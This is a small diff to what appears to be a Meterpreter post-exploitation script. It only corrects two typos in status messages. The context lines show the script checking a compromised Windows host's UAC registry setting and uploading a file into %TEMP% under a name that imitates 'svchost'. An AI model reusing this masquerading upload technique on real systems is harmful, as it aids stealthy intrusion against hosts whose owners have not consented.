@@ -56,7 +56,7 @@ def checkuac(session)
 	uac = false
 	winversion = session.sys.config.sysinfo
 	if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
-		print_status("Checking if UAC is enaled ...")
+		print_status("Checking if UAC is enabled ...")
 		key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
 		root_key, base_key = session.sys.registry.splitkey(key)
 		value = "EnableLUA"
@@ -215,7 +215,7 @@ end
 def upload(session,file)
 	location = session.fs.file.expand_path("%TEMP%")
 	fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
-	print_status("Uploadingd #{file}....")
+	print_status("Uploading #{file}....")
 	session.fs.file.upload_file("#{fileontrgt}","#{file}")
 	print_status("#{file} uploaded!")
 	return fileontrgt
